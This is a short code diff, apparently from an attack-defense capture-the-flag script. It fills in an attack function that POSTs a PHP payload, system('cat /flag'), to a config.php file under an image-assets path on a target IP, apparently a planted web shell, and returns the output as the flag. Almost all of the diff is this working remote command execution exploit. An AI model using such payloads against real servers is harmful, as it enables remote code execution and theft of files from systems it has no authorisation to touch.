@@ -13,10 +13,16 @@ def attack(ip:str):
     print('get flag!')
     flag = res.text
     """
+    try:
+        # cookies = {"PHPSESSID": "vg8rjkjtbugu49v6f7cq71pth0"}
+        data = {'s': 'system(\'cat /flag\');'}
+        res = requests.post('http://'+ip+'/assets/imgs/config.php',data = data)
+        print(res.text)
+        print('get flag!')
+        flag = res.text
+    except:
+        flag = 'error'
 
-
-
-    flag = ''
     return str(flag)
 
 
